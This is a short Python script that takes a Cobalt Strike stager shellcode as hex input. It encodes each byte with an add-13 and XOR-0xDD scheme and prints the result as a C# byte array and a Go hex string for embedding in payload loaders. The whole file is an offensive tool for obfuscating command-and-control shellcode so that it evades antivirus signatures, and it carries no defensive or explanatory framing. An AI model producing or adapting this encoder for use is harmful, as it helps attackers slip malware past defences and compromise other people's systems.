import binascii
## Cobalt Strike payload... ensure to append string with 'b' to indicate binary
buf = input("Cobalt Strike created stager: ").replace('\\x','')
buf = bytearray.fromhex(buf)

encoded = bytearray(len(buf))
for i, c in enumerate(buf):
    encoded[i] = (c + 13) & 0xFF
    encoded[i] = encoded[i] ^ 0xDD

csharp_out = ""
golang_out = ""

for b in encoded:
    csharp_out += "0x{0:02x}, ".format(b)
    golang_out += "{0:02x}".format(b)

print(f"\nThe C# payload is:\n{csharp_out[:-2]}")
print(f"\n\nThe Golang payload is:\n{golang_out}")
